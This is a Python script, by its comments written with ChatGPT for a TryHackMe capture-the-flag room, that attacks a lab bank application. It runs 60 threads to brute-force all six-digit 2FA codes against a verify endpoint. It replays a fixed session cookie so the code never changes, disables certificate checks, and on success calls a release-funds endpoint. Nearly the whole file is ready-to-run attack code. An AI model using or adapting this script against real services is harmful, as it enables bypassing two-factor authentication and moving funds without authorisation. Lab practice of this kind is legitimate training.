# script by ChatGPT
# sript for tryhackme room BreachBlocker Unlocker https://tryhackme.com/room/sq4-aoc2025-32LoZ4zePK
# YouTube video walk through: https://youtu.be/xINJWj8zcrQ

#!/usr/bin/env python3
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET = "https://10.48.173.35"

# IMPORTANT:
# Put the FULL cookie exactly as sent by the server (the value after "session="),
# and include the "session=" prefix here.
FROZEN_COOKIE = "session="

WORKERS = 60                 # tune up/down if the box gets sad
START = 0
END = 1_000_000              # 000000 .. 999999
CHUNK = 5000                 # how many codes per batch of futures
PRINT_FIRST_N = 10           # print every detail for the first N tries
PRINT_EVERY = 2000           # afterwards, print a progress line every N attempts

VERIFY_URL = f"{TARGET}:8443/api/verify-2fa"
RELEASE_URL = f"{TARGET}:8443/api/release-funds"

stop_event = threading.Event()
attempt_counter = 0
attempt_lock = threading.Lock()
printed_no2fa = False

def post_verify(code: str):
    """Send verify request with the *frozen* cookie header."""
    headers = {
        "Cookie": FROZEN_COOKIE,
        "Content-Type": "application/json",
    }
    r = requests.post(
        VERIFY_URL,
        headers=headers,
        json={"code": code},
        verify=False,
        timeout=10,
    )
    return r

def try_one(i: int):
    """Try a single OTP code. Return (code, set_cookie, body) on success else None."""
    if stop_event.is_set():
        return None

    code = f"{i:06d}"
    r = post_verify(code)

    body = r.text.strip()
    sc = r.headers.get("Set-Cookie", "")

    # Debug printing / progress
    global attempt_counter, printed_no2fa
    with attempt_lock:
        attempt_counter += 1
        n = attempt_counter

    # Print detailed for first N, then periodic, plus any weird condition
    if n <= PRINT_FIRST_N or (n % PRINT_EVERY == 0):
        print(f"[{n}] code={code} status={r.status_code} body={body[:200]}")
        if sc:
            print(f"     Set-Cookie: {sc[:200]}{'...' if len(sc) > 200 else ''}")

    if "No 2FA code generated" in body and not printed_no2fa:
        printed_no2fa = True
        print("[!] Got 'No 2FA code generated'  this means the request reached verify without bank_2fa_code in the cookie.")
        print("    If you truly keep sending the same frozen cookie, you should NOT see this. Double-check FROZEN_COOKIE value.")

    # Success condition: JSON {"success": true}
    if r.status_code == 200:
        try:
            j = r.json()
            if j.get("success") is True:
                return (code, sc, body)
        except Exception:
            pass

    return None

def release_funds(success_set_cookie: str):
    """Use the successful Set-Cookie to call /api/release-funds."""
    if not success_set_cookie:
        print("[!] Success response had no Set-Cookie header (unexpected).")
        return

    # Keep only the session=... part
    session_kv = success_set_cookie.split(";", 1)[0]
    headers = {"Cookie": session_kv, "Content-Type": "application/json"}

    r = requests.post(RELEASE_URL, headers=headers, json={}, verify=False, timeout=10)
    print(f"[+] /api/release-funds status={r.status_code}")
    print(r.text)

def main():
    print("[*] Sanity check: two wrong tries should BOTH say 'Invalid code'")
    r1 = post_verify("000000")
    r2 = post_verify("000000")
    print("    #1:", r1.status_code, r1.text.strip())
    print("    #2:", r2.status_code, r2.text.strip())
    print("    (If both are 'Invalid code', your cookie is truly frozen  good.)\n")

    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
        for base in range(START, END, CHUNK):
            if stop_event.is_set():
                break

            futures = [ex.submit(try_one, i) for i in range(base, min(base + CHUNK, END))]

            for fut in as_completed(futures):
                res = fut.result()
                if res:
                    code, set_cookie, body = res
                    stop_event.set()
                    print("\n[+] OTP FOUND:", code)
                    print("[+] verify response body:", body)
                    print("[+] verify Set-Cookie:", set_cookie)
                    print("\n[*] Trying /api/release-funds with success cookie...\n")
                    release_funds(set_cookie)
                    return

    print("[-] Completed range without finding OTP (unexpected unless rate-limited/blocked).")

if __name__ == "__main__":
    main()

